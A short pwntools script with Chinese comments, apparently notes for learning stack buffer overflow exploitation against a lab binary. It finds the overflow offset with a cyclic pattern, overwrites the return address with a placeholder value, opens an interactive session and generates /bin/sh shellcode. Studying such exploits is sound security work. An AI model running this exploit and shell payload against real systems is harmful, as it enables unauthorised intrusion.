from pwn import *

r = remote('192.168.56.101',8888)
r = remote('127.0.0.1',8888)

#wait for gdb attching
raw_input('pause')

#送500個特定四個不連續byte的字串過去
#之後透過gdb查找到想要位置的字串 就可以查詢offset
r.send(cyclic(500)+'\n')
#假設為ddbd cyclic(500).find('ddbd')
# >> 112


#注意p32 p64
r.send('A'*112+p32(0x12345678)+'\n')

#加入使用者輸入
r.interactive()


#使用ELF去load一個binary exe
#可以查找有用的資訊

#output 可能的漏洞
elf = ELF('./bin')

#return gets function的位置
hex(elf.symbols['gets'])

#compile system("sh") by pwntools
context.arch = 'i386'

shell = asm(shellcraft.sh())

